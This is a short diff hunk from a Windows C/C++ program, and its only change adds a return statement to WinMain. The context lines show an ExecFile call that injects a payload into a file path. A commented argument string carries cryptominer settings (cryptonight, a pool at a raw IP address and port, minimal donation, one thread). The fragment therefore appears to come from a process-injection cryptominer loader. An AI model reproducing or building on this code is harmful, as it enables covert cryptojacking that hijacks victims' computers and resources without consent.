@@ -98,5 +98,5 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 		//or you may write the file path you want to inject in.
 		ExecFile(LPSTR(szFilePath), pFile, ""); // "  --donate-level=1 -a cryptonight --url=35.204.135.202:3333 --threads 1 --user=x"
 	}
-
+	return 0;
 };
